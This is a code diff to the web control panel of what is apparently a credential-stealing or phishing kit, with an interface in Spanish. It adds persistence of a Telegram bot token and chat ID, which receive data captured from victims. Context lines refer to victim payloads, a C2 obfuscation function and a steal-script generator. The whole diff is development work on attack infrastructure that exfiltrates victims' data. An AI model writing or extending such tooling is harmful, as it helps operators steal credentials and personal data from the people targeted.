@@ -2795,7 +2795,7 @@ textarea.fi{resize:vertical;min-height:48px}
     <div style="font-size:11px;color:var(--mut);margin-bottom:6px">Los datos capturados se reenv&#237;an al bot autom&#225;ticamente desde el servidor. El token nunca aparece en el payload enviado a la v&#237;ctima.</div>
     <div class="row" style="margin-bottom:6px;flex-wrap:wrap">
       <div class="ig w2">
-        <div class="lbl">BOT TOKEN</div>
+        <div class="lbl" style="display:flex;align-items:center;gap:6px">BOT TOKEN <span id="tg-saved-badge" style="display:none;font-size:9px;background:#0d2a0d;border:1px solid #1a5020;color:#4a9060;border-radius:2px;padding:1px 5px;letter-spacing:.5px">&#128274; GUARDADO</span></div>
         <input class="fi" id="tg-token" placeholder="123456:ABCdef..." autocomplete="off" type="password">
       </div>
       <div class="ig">
@@ -2803,7 +2803,8 @@ textarea.fi{resize:vertical;min-height:48px}
         <input class="fi" id="tg-chatid" placeholder="-100xxxxxxxx o @username">
       </div>
     </div>
-    <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
+    <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center;flex-wrap:wrap">
+      <button class="kbtn" style="border-color:#c8a020;color:#c8a020" onclick="tgSaveCreds()">&#128190; GUARDAR</button>
       <button class="kbtn" style="border-color:#2ca5e0;color:#2ca5e0" onclick="saveTgConfig(true)">&#9654; ACTIVAR</button>
       <button class="kbtn" style="border-color:#444;color:#888"        onclick="saveTgConfig(false)">&#9632; DESACTIVAR</button>
       <button class="kbtn" style="border-color:#1a3a1a;color:#4a9060"  onclick="testTelegram()">&#9993; TEST</button>
@@ -7957,6 +7958,24 @@ function _obfC2(url) {
   );
 }
 
+function tgSaveCreds() {
+  var token   = (document.getElementById('tg-token')  || {}).value || '';
+  var chat_id = (document.getElementById('tg-chatid') || {}).value || '';
+  var msg     = document.getElementById('tg-msg');
+  if (!token || !chat_id) {
+    if (msg) { msg.style.color='#cc4060'; msg.textContent='Falta token o chat ID.'; }
+    return;
+  }
+  try {
+    localStorage.setItem('tgToken', token);
+    localStorage.setItem('tgChatId', chat_id);
+  } catch(e) {}
+  var badge = document.getElementById('tg-saved-badge');
+  if (badge) badge.style.display = 'inline-block';
+  if (msg) { msg.style.color='#c8a020'; msg.textContent='Credenciales guardadas localmente \u2713'; }
+  setTimeout(function(){ if (msg) msg.textContent=''; }, 3000);
+}
+
 function saveTgConfig(enable) {
   var token   = (document.getElementById('tg-token')  || {}).value || '';
   var chat_id = (document.getElementById('tg-chatid') || {}).value || '';
@@ -7976,9 +7995,12 @@ function saveTgConfig(enable) {
     if (enable) {
       if (dot) { dot.style.color='#2ca5e0'; dot.textContent='\u25cf activo'; }
       if (msg) { msg.style.color='#4a9060'; msg.textContent='Telegram activado \u2713'; }
+      // Persist to localStorage so fields survive page reload
+      try { localStorage.setItem('tgToken', token); localStorage.setItem('tgChatId', chat_id); localStorage.setItem('tgEnabled', '1'); } catch(e){}
     } else {
       if (dot) { dot.style.color='var(--mut)'; dot.textContent='\u25cf desactivado'; }
       if (msg) { msg.style.color='var(--mut)'; msg.textContent='Desactivado.'; }
+      try { localStorage.setItem('tgEnabled', '0'); } catch(e){}
     }
   })
   .catch(function(e){ if (msg) { msg.style.color='#cc4060'; msg.textContent='Error: '+e; } });
@@ -7992,13 +8014,41 @@ function testTelegram() {
     .catch(function(e){ if (msg) { msg.style.color='#cc4060'; msg.textContent='Error: '+e; } });
 }
 
-// Load TG status on page load
+// Load TG status on page load — restore from localStorage first, then sync to server
 function _loadTgStatus() {
-  fetch('/api/tg/config').then(function(r){ return r.json(); }).then(function(d){
-    var dot = document.getElementById('tg-status-dot');
-    if (!dot) return;
-    if (d.enabled) { dot.style.color='#2ca5e0'; dot.textContent='\u25cf activo'; }
-  }).catch(function(){});
+  try {
+    var token   = localStorage.getItem('tgToken')  || '';
+    var chatId  = localStorage.getItem('tgChatId') || '';
+    var enabled = localStorage.getItem('tgEnabled') === '1';
+    var tEl = document.getElementById('tg-token');
+    var cEl = document.getElementById('tg-chatid');
+    if (tEl && token)  tEl.value = token;
+    if (cEl && chatId) cEl.value = chatId;
+    if (token && chatId) {
+      var badge = document.getElementById('tg-saved-badge');
+      if (badge) badge.style.display = 'inline-block';
+    }
+    if (token && chatId) {
+      // Auto-restore config to server (server lost it on restart)
+      fetch('/api/tg/config', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({token: token, chat_id: chatId, enabled: enabled})
+      }).then(function(r){ return r.json(); }).then(function(d){
+        var dot = document.getElementById('tg-status-dot');
+        if (!dot) return;
+        if (enabled) { dot.style.color='#2ca5e0'; dot.textContent='\u25cf activo'; }
+        else { dot.style.color='var(--mut)'; dot.textContent='\u25cf desactivado'; }
+      }).catch(function(){});
+    }
+  } catch(e) {
+    // localStorage unavailable — fall back to server query
+    fetch('/api/tg/config').then(function(r){ return r.json(); }).then(function(d){
+      var dot = document.getElementById('tg-status-dot');
+      if (!dot) return;
+      if (d.enabled) { dot.style.color='#2ca5e0'; dot.textContent='\u25cf activo'; }
+    }).catch(function(){});
+  }
 }
 
 function genStealJS(type, btn) {
